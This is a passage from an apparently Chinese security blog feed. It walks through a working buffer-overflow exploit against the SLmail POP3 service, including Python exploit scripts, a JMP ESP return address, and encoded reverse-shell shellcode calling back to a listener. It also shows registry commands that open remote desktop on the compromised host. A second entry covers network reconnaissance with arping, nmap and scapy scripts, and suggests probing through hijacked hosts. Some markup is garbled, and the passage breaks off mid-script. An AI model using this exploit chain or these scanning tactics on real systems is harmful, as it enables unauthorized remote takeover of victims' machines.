<li><p>然后查看esp中C的结束地址：（通过计算可以得出esp的空间大小为四百多，可以放下一个shellcode）<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/79008411.jpg" alt></p>
</li>
<li><p>由于不同类型的程序、协议、漏洞、会认为一些字符是坏字符，这些字符有固定用途</p>
<ul>
<li><p>返回地址、shellcode、buffer都不能出现坏字符</p>
</li>
<li><p>null byte (0x00) 空字符、用于终止字符串的拷贝操作</p>
</li>
<li><p>return （0x0D）回车操作，表示POP3 PASS命令输入完成</p>
</li>
<li><p>思路：发送0x00——0xff 256个字符，查找所有坏字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars = (</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0b\x0c\x0d\x0e\x0f\x00"</span></span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x10"</span></span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x20"</span></span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x30"</span></span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\4e\x4f\x40"</span></span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x50"</span></span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x60"</span></span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x70"</span></span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x80"</span></span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x90"</span></span><br><span class="line"><span class="string">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xa0"</span></span><br><span class="line"><span class="string">"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xb0"</span></span><br><span class="line"><span class="string">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xc0"</span></span><br><span class="line"><span class="string">"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xd0"</span></span><br><span class="line"><span class="string">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xe0"</span></span><br><span class="line"><span class="string">"\xe1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0"</span></span><br><span class="line">)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2606</span> + <span class="string">'B'</span> * <span class="number">4</span> + badchars</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21611430.jpg" alt></p>
</li>
<li><p>这里我们可以发现ESP寄存器中没有内容了，然后follow in dump 查看具体位置，发现数据一直到0A的时候就异常了，然后修改脚本，删去0A，通过这种方法找到三个坏字符：0A 0D 00</p>
</li>
</ul>
</li>
<li><p>理论上这个时候就可以进行数据的重定项了，将EIP的内容改为ESP的地址，但实际上是ESP的地址是变化的，所以这样就没有办法做重定向，硬编码不可行，这里就需要变通思路：</p>
<ul>
<li><p>在内存中寻找地址固定的系统模块</p>
</li>
<li><p>在模块中寻找JMP ESP（内存地址固定不变）指令的地址跳转，再由该指令间接跳转到ESP，从而执行shellcode</p>
</li>
<li><p>mono.py脚本识别内存模块，搜索return address 是JMP ESP指令的模块</p>
</li>
<li><p>寻找无DEP、ALSR保护的内存地址</p>
</li>
<li><p>内存地址不含坏字符</p>
</li>
<li><p>配置好调试工具，启动mono脚本：<figure class="highlight plain"><figcaption><span>modules```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/86872565.jpg)</span><br><span class="line"></span><br><span class="line">  我们可以发现系统正在运行的模块都出现了，那么如何找到合适的模块呢，先介绍一下上面的参数</span><br><span class="line"></span><br><span class="line">  rebase（操作系统重启以后是否发生变化，如变化，则为true，否则为false）这里寻找false的</span><br><span class="line"></span><br><span class="line">  safeseh aslr nxcompat 是操作系统的安全机制，都选false,true的是带有保护机制的，内存地址都是随机的。</span><br><span class="line"></span><br><span class="line">  OS dll表示每个操作系统都有的这里都选为TRUE</span><br><span class="line"></span><br><span class="line">- 由于计算机内存中存储的是二进制，汇编指令肯定是无法查找的，所以通过工具将汇编指令转换成二进制：</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/17531204.jpg)</span><br><span class="line"></span><br><span class="line">- 然后我们进行jmp esp的查找，由于调试工具数据是十六进制，所以需要以十六进制的形式进行查找：```! mona find -s &quot;\xff\xe4&quot; -m slmfc.dll</span><br></pre></td></tr></table></figure></p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/28063784.jpg" alt></p>
</li>
<li><p>很遗憾，这个模块里面没有，换其他模块，然后就可以找到可利用的：<figure class="highlight plain"><figcaption><span>-s "\xff\xe4" -m slmfc.dll```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/37554586.jpg)</span><br><span class="line"></span><br><span class="line">- 然后我们双击第一个模块，然后以汇编指令显示就会发现FFES: jmp esp</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/52427619.jpg)</span><br><span class="line"></span><br><span class="line">- 在jmp esp指令这里设置断点：（主要是为了利用脚本向跳转的这里发送溢出的代码，验证是否正常可以跳转）</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/8694262.jpg)</span><br><span class="line"></span><br><span class="line">- 然后我们修改前面精确溢出的代码，溢出的四个字节改为这里设置断点的内存地址，也就是jmp esp ，在添加390个C，也就是说：当程序执行到这jmp esp的时候，跳到ESP寄存器，然后将390个C存入ESP中</span><br><span class="line"></span><br><span class="line">  - 首先我们可以看到jmp esp的地址为：5F 4A 35 8F</span><br><span class="line"></span><br><span class="line">    ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/38278009.jpg)</span><br><span class="line"></span><br><span class="line">  - 然后我们在脚本里构造溢出的内容为这个地址，由于计算机读取数据和人读是相反的，所以要将地址反过来构造：</span><br><span class="line"></span><br><span class="line">    ```python</span><br><span class="line">    #!/usr/bin/python</span><br><span class="line">    import socket</span><br><span class="line"> </span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    buffer = &apos;A&apos; * 2606 + &apos;\x8f\x35\x4a\x5f&apos; + &apos;C&apos; * 390</span><br><span class="line">    try:</span><br><span class="line">        print &quot;\nSending evil buffer...&quot;</span><br><span class="line">        s.connect((&apos;192.168.111.137&apos;,110))</span><br><span class="line">        data = s.recv(1024)</span><br><span class="line">        s.send(&apos;USER test&apos; + &apos;\r\n&apos;)</span><br><span class="line">        data = s.recv(1024)</span><br><span class="line">        s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">        print &quot;\nDone!&quot;</span><br><span class="line">    except:</span><br><span class="line">        print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure></p>
<ul>
<li><p>然后发送数据，查看EIP和ESP的内容：（发现确实跳转了，EIP的内容为跳转的地址，存储C也是在ESP中执行了，说明我们可以执行shellcode）</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/73683041.jpg" alt></p>
<p>按F7执行下一步，发现又跳转到EIP：</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21013466.jpg" alt></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>现在解决了ESP的地址跳转问题，我们就可以进一步构造shellcode执行，进行系统的控制：</p>
<ul>
<li><p>生成shellcode</p>
</li>
<li><p>scratch  （可以用这个去自己写）</p>
</li>
<li><p>用msfpayload生成shellcode</p>
<ul>
<li><figure class="highlight plain"><figcaption><span>-l``` 查看所有的payload</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - ```sudo ./msfpayload win32_reverse LHOST=192.168.111.140 LPORT=4444 C```  用反向连接的这个载荷，C表示的是C语言格式，但是生成以后我们发现存在坏字符，所以shellcode不能使用</span><br><span class="line"></span><br><span class="line">  - ```sudo ./msfpayload win32_reverse LHOST=192.168.111.140 LPORT=4444 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;```   这里使用msfemcode对三个字符进行转义，R是保证msfemcode可以使用、</span><br><span class="line"></span><br><span class="line">    ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/15011544.jpg)</span><br><span class="line"></span><br><span class="line">- 将shellcode加入代码中：</span><br><span class="line"></span><br><span class="line">  ```python</span><br><span class="line">  #!/usr/bin/python</span><br><span class="line">  import socket</span><br><span class="line"> </span><br><span class="line">  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">  shellcode = (</span><br><span class="line">  &quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf7\x71\x2c&quot; +</span><br><span class="line">  &quot;\xc1\x83\xeb\xfc\xe2\xf4\x0b\x1b\xc7\x8c\x1f\x88\xd3\x3e\x08\x11&quot; +</span><br><span class="line">  &quot;\xa7\xad\xd3\x55\xa7\x84\xcb\xfa\x50\xc4\x8f\x70\xc3\x4a\xb8\x69&quot; +</span><br><span class="line">  &quot;\xa7\x9e\xd7\x70\xc7\x88\x7c\x45\xa7\xc0\x19\x40\xec\x58\x5b\xf5&quot; +</span><br><span class="line">  &quot;\xec\xb5\xf0\xb0\xe6\xcc\xf6\xb3\xc7\x35\xcc\x25\x08\xe9\x82\x94&quot; +</span><br><span class="line">  &quot;\xa7\x9e\xd3\x70\xc7\xa7\x7c\x7d\x67\x4a\xa8\x6d\x2d\x2a\xf4\x5d&quot; +</span><br><span class="line">  &quot;\xa7\x48\x9b\x55\x30\xa0\x34\x40\xf7\xa5\x7c\x32\x1c\x4a\xb7\x7d&quot; +</span><br><span class="line">  &quot;\xa7\xb1\xeb\xdc\xa7\x81\xff\x2f\x44\x4f\xb9\x7f\xc0\x91\x08\xa7&quot; +</span><br><span class="line">  &quot;\x4a\x92\x91\x19\x1f\xf3\x9f\x06\x5f\xf3\xa8\x25\xd3\x11\x9f\xba&quot; +</span><br><span class="line">  &quot;\xc1\x3d\xcc\x21\xd3\x17\xa8\xf8\xc9\xa7\x76\x9c\x24\xc3\xa2\x1b&quot; +</span><br><span class="line">  &quot;\x2e\x3e\x27\x19\xf5\xc8\x02\xdc\x7b\x3e\x21\x22\x7f\x92\xa4\x32&quot; +</span><br><span class="line">  &quot;\x7f\x82\xa4\x8e\xfc\xa9\x37\xd9\x43\x4d\x91\x19\x3d\x9d\x91\x22&quot; +</span><br><span class="line">  &quot;\xa5\x20\x62\x19\xc0\x38\x5d\x11\x7b\x3e\x21\x1b\x3c\x90\xa2\x8e&quot; +</span><br><span class="line">  &quot;\xfc\xa7\x9d\x15\x4a\xa9\x94\x1c\x46\x91\xae\x58\xe0\x48\x10\x1b&quot; +</span><br><span class="line">  &quot;\x68\x48\x15\x40\xec\x32\x5d\xe4\xa5\x3c\x09\x33\x01\x3f\xb5\x5d&quot; +</span><br><span class="line">  &quot;\xa1\xbb\xcf\xda\x87\x6a\x9f\x03\xd2\x72\xe1\x8e\x59\xe9\x08\xa7&quot; +</span><br><span class="line">  &quot;\x77\x96\xa5\x20\x7d\x90\x9d\x70\x7d\x90\xa2\x20\xd3\x11\x9f\xdc&quot; +</span><br><span class="line">  &quot;\xf5\xc4\x39\x22\xd3\x17\x9d\x8e\xd3\xf6\x08\xa1\x44\x26\x8e\xb7&quot; +</span><br><span class="line">  &quot;\x55\x3e\x82\x75\xd3\x17\x08\x06\xd0\x3e\x27\x19\xdc\x4b\xf3\x2e&quot; +</span><br><span class="line">  &quot;\x7f\x3e\x21\x8e\xfc\xc1&quot;)</span><br><span class="line">  buffer = &apos;A&apos; * 2606 + &apos;\x8f\x35\x4a\x5f&apos; + &apos;\x90&apos; * 8 +shellcode</span><br><span class="line">  try:                </span><br><span class="line">      #\x90表示的是汇编中的nop，就是不执行操作，保证shellcode的可用性，为了防止esp执行的时候把我的shellcode的前面几个字符忽略掉</span><br><span class="line">      print &quot;\nSending evil buffer...&quot;</span><br><span class="line">      s.connect((&apos;192.168.111.137&apos;,110))</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;USER test&apos; + &apos;\r\n&apos;)</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">      print &quot;\nDone!&quot;</span><br><span class="line">  except:</span><br><span class="line">      print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
<li><p>现在我们监听本地的4444端口，等待反向连接</p>
<figure class="highlight plain"><figcaption><span>nc -vlp 4444```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 然后保证SLmail服务正常运行，发送数据，然后缓冲区溢出利用成功，拿到系统权限：</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/34848509.jpg)</span><br><span class="line"></span><br><span class="line">  - 执行系统命令：</span><br><span class="line"></span><br><span class="line">    ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21092299.jpg)</span><br><span class="line"></span><br><span class="line">  - 觉得命令行不舒服：改注册表，然后3389远程连接：</span><br><span class="line"></span><br><span class="line">    - ```tex</span><br><span class="line">      echo Windows Registry Editor Version 5.00&gt;3389.reg</span><br><span class="line">      echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg</span><br><span class="line">      echo &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;3389.reg</span><br><span class="line">      C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg</span><br><span class="line">      echo [HKEY_LOCAL_MACHINE\SYSTEM Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg</span><br><span class="line">      C:\&gt;echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line">      echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line">      C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg</span><br><span class="line">      echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg</span><br><span class="line">      echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line">      regedit /s 3389.reg</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>rdesktop 192.168.111.137</code>  远程桌面连接。</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-23/7906793.jpg" alt></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>fuzzy</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>fuzzy</tag>
        <tag>缓冲区溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>主动信息收集</title>
    <url>/2018/06/05/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E4%BA%8C%E5%B1%82%E5%8F%91%E7%8E%B0/</url>
    <content><![CDATA[<blockquote>
<p>被动收集的信息可能不是最新的信息，通过主动的手段去发现更精确的信息</p>
</blockquote>
<ul>
<li>直接与目标系统交互通信</li>
<li>无法避免留下访问的痕迹（如果目标系统有完善的系统日志）</li>
<li>使用受控的第三方电脑进行探测<ul>
<li>使用代理或已经被控制的主机</li>
<li>做好本封杀的准备</li>
<li>使用噪声迷惑目标，淹没真实的探测流量</li>
</ul>
</li>
<li>扫描<ul>
<li>发送不同的探测，根据返回结果判断目标状态（ip，端口，服务）</li>
</ul>
</li>
</ul>
<h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><ul>
<li>识别活着的主机<ul>
<li>潜在的被攻击目标</li>
</ul>
</li>
<li>输出一个ip地址列表</li>
<li>2，3，4层发现</li>
</ul>
<h4 id="发现——二层发现"><a href="#发现——二层发现" class="headerlink" title="发现——二层发现"></a>发现——二层发现</h4><ul>
<li>优点：扫描速度快，可靠</li>
<li>缺点：不可路由，只能发现本网段</li>
<li>ARP协议<ul>
<li>抓包</li>
</ul>
</li>
</ul>
<ol>
<li><p>arping:(二层中单个存活主机的探测)</p>
<ul>
<li><figure class="highlight plain"><figcaption><span>arping 192.168.0.1 -c 1```  -c是指定发送一个包以后看是否存在，否则会一直发包；如果不在一个网络里，发包的话是不存在的</span></figcaption><table><tr><td class="code"><pre><span class="line">   - ```sudo arping 192.168.0.1 -d``` -d是同一个ip拥有不同的Mac地址，就是说，如果结果显示有两个Mac地址声称自己是网关，那么你的网络就存在arp欺骗，然后根据路由器查arp表进行定位</span><br><span class="line">   - ```sudo arping 192.168.0.1 -c 1 | grep &quot;bytes from&quot; | cut -d&quot; &quot; -f 5 |cut -d &quot;(&quot; -f 2 | cut -d&quot;)&quot; -f 1``` 通过管道显示活着的主机</span><br><span class="line">   - 但是这样只能扫描一个ip，不能自动化的去扫描一个网段，所以用脚本去实现：扫描的时候可以指定网卡，这里用bash脚本来实现这个功能```sudo ./arping1.sh eth0 &gt; addr.txt``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/12275742.jpg)</span><br><span class="line">   - 第二个脚本：这个脚本的功能是去探测已知ip列表的主机是否存活的脚本，前提是要有一个ip列表的文件```sudo ./arping2.sh addr.txt``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/77751631.jpg)</span><br><span class="line">   - 如果要在扫描的时候直接将结果重定向到一个文本文件中，直接早bash脚本中添加即可</span><br><span class="line"></span><br><span class="line">2. 二层发现——nmap:</span><br><span class="line"></span><br><span class="line">   - ```nmap -sn 192.168.0.1/24```   扫描速度更快，显示的信息更多</span><br><span class="line"></span><br><span class="line">   - &gt; Nmap scan report for 192.168.0.1</span><br><span class="line">     &gt; Host is up (0.020s latency).</span><br><span class="line">     &gt; Nmap scan report for 192.168.0.101</span><br><span class="line">     &gt; Host is up (0.0011s latency).</span><br><span class="line">     &gt; Nmap scan report for 192.168.0.104</span><br><span class="line">     &gt; Host is up (0.084s latency).</span><br><span class="line">     &gt; Nmap scan report for 192.168.0.107</span><br><span class="line">     &gt; Host is up (0.00059s latency).</span><br><span class="line">     &gt; Nmap done: 256 IP addresses (4 hosts up) scanned in 5.65 seconds</span><br><span class="line"></span><br><span class="line">   - ```nmap -iL filename -sn``` 这个可以做和arping第二个脚本一样的工作</span><br><span class="line"></span><br><span class="line">     &gt; -sn 参数不做端口扫描，但它不仅仅发ARP记录，还会DNS做ptr反向域名解析的解析</span><br><span class="line"></span><br><span class="line">3. 二层发现———Netdiscover</span><br><span class="line"></span><br><span class="line">   - 专用与二层发现</span><br><span class="line">   - 可用于无线和交换网络环境</span><br><span class="line">   - 主动和被动扫描</span><br><span class="line">   - 主动</span><br><span class="line">     - netdiscover -i eth0 -r 192.168.0.1/24![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/71668956.jpg)</span><br><span class="line">     - netdiscover -l iplist.txt</span><br><span class="line">   - 被动</span><br><span class="line">     - netdiscover -p （开启混杂模式）只要在在网卡上有arp包数据，就可以侦听到：![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/18073354.jpg)</span><br><span class="line">     - 主动arp容易触发预警</span><br><span class="line"></span><br><span class="line">4. 二层发现———Scapy</span><br><span class="line"></span><br><span class="line">   - scapy</span><br><span class="line"></span><br><span class="line">     - 作为Python的库文件进行调用</span><br><span class="line">     - 也可以做单独的工具使用</span><br><span class="line">     - 抓包，分析，创建，修改，注入网络流量</span><br><span class="line"></span><br><span class="line">   - apt-get install python-gnuplot</span><br><span class="line"></span><br><span class="line">   - 输入scapy启动scapy启动，然后输入ARP()调用这个函数，```ARP().display()查询ARP函数的属性``` ，这样就可以定制（arp的报头结构，将函数的属性字段添加进去，这样就可以实现一个arp查询）![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/83165222.jpg)</span><br><span class="line"></span><br><span class="line">   - 直接利用scapy进行arp探测，实际上就是通过调用scapy自带的函数进行查询：</span><br><span class="line"></span><br><span class="line">     - 首先```sudo scapy``` 启动进行scapy命令行模式下</span><br><span class="line">     - 通过```ARP().display()``` 可以查看APR这个函数下的函数头，然后这只pdst这个要查询的目标```arp.pdst=&quot;192.168.0.1&quot;``` 这里的arp是设置的变量</span><br><span class="line">     - 通过```sr1(arp)``` 进行发包然后查看回显：这里也可以设置一个anwser变量带代替返回的数据包，然后调用display方法查看数据包的返回情况（有一个问题，如果查询的是一个不存在的ip，这样会一直发包，所以要加上timeout，加上一个verbose=1，显示详细的信息）![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/81052649.jpg)</span><br><span class="line">     - scapy是Python的库，所以也支持Python脚本来进行探测，可以调用这个库来写脚本进行arp扫描，前面用的是shell脚本```sudo ./arp_disc.py eth0```  用脚本的话要慢，首先这里设计的脚本不是多线程，其次还要判断超时的时间，当然为了准确性，scarp默认发两个数据包</span><br><span class="line"></span><br><span class="line">     &gt; ```python</span><br><span class="line">     &gt; #!/usr/bin/python</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; import logging</span><br><span class="line">     &gt; import subprocess</span><br><span class="line">     &gt; logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">     &gt; from scapy.all import *</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; if len(sys.argv) != 2:</span><br><span class="line">     &gt;     print &quot;Usage - ./arp_disc.py [interface]&quot;</span><br><span class="line">     &gt;     print &quot;Example - ./ar_disc.py eth0&quot;</span><br><span class="line">     &gt;     print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">     &gt;     sys.exit()</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; interface = str(sys.argv[1])</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; ip = subprocess.check_output(&quot;ifconfig&quot; + interface + &quot; | grep &apos;inet&apos; | cut -d&apos;.&apos; -f 1-3 | cut -d&quot; &quot; -f 10 | cut -d &apos;f&apos; -f 1 &quot;,shell = True).strip()</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; prefix = ip.split(&apos;.&apos;)[0] + &apos;.&apos; + ip.split(&apos;.&apos;)[1] + &apos;.&apos; +ip.split(&apos;.&apos;)[2] + &apos;.&apos;</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; for addr in range(1,254):</span><br><span class="line">     &gt;     answer = sr1(ARP(pdst=prefix+str(addr)),timeout = 1,verbose = 0)</span><br><span class="line">     &gt;     if answer == None:</span><br><span class="line">     &gt;         pass</span><br><span class="line">     &gt;     else:</span><br><span class="line">     &gt;         print prefix + str(addr)</span><br><span class="line">     &gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>第二个脚本，这个脚本和arping的第二个脚本类似，都是可以调用已知的ip列表文件进行二层的发现：<figure class="highlight plain"><figcaption><span>./arp_disc.py ip_list.txt```  脚本代码如下：</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&gt; ```python</span><br><span class="line">&gt; #!/usr/bin/python</span><br><span class="line">&gt; #-*- coding:utf-8 -*-</span><br><span class="line">&gt; </span><br><span class="line">&gt; import logging</span><br><span class="line">&gt; import subprocess</span><br><span class="line">&gt; logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">&gt; from scapy.all import *</span><br><span class="line">&gt; </span><br><span class="line">&gt; if len(sys.argv) != 2:</span><br><span class="line">&gt; print &quot;Usage - ./arp_disc.py [filename]&quot;</span><br><span class="line">&gt; print &quot;Example - ./arp_disc.py ip_list.txt&quot;</span><br><span class="line">&gt; print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">&gt; sys.exit()</span><br><span class="line">&gt; </span><br><span class="line">&gt; filename = str(sys.argv[1])</span><br><span class="line">&gt; file = open(filename,&apos;r&apos;)    #打开文件列表</span><br><span class="line">&gt; </span><br><span class="line">&gt; for addr in file:</span><br><span class="line">&gt; answer = sr1(ARP(pdst=prefix+str(addr)),timeout = 0.1,verbose = 0) #verbose=0，不显示报错的具体信息</span><br><span class="line">&gt; if answer == None:</span><br><span class="line">&gt;     pass</span><br><span class="line">&gt; else:</span><br><span class="line">&gt;     print addr.strip()    #将报错信息打印出来</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
</blockquote>
</li>
</ul>
</li>
</ol>
<blockquote>
<p><strong>总结：二层的发现主要是在拿下一台主机以后以此机器作为跳板进而对整个内网进行发现，但是由于内网的网络环境未知，而且服务器上面不一定有nmap，所以我们要利用一切可以利用的工具：arping，nmap,netdiscover,scopy等工具，以及自己编写的脚本</strong></p>
</blockquote>
<p><em>针对上面的两个脚本再补充两个多线程的脚本，就当做py练手了</em></p>
<ol>
<li><blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt; <span class="comment">#!/usr/bin/python</span></span><br><span class="line">&gt; <span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">&gt; <span class="keyword">import</span> logging</span><br><span class="line">&gt; <span class="keyword">import</span> subprocess</span><br><span class="line">&gt; <span class="keyword">import</span> threading,time</span><br><span class="line">&gt;</span><br><span class="line">&gt; logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line">&gt; <span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Usage - ./arp_disc.py [interface]"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example - ./arp_disc.py eth0"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example will perform an ARP scan of the local subnet to which eth0 is assigned"</span></span><br><span class="line">&gt;     sys.exit()</span><br><span class="line">&gt;</span><br><span class="line">&gt; interface = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">&gt;</span><br><span class="line">&gt; ip = subprocess.check_output(</span><br><span class="line">&gt;     <span class="string">"ifconfig "</span> + interface + <span class="string">" | grep 'inet' | cut -d'.' -f 1-3 | cut -d' ' -f 10 | cut -d 'f' -f 1 "</span>,</span><br><span class="line">&gt;     shell = <span class="keyword">True</span>).strip()</span><br><span class="line">&gt; prefix = ip.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + ip.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + ip.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         threading.Thread.__init__(self)</span><br><span class="line">&gt;</span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         <span class="keyword">global</span> answer,lock,n</span><br><span class="line">&gt;         time.sleep(<span class="number">0.1</span>)</span><br><span class="line">&gt;         <span class="keyword">if</span> lock.acquire():</span><br><span class="line">&gt;             answer = sr1(ARP(pdst = prefix + 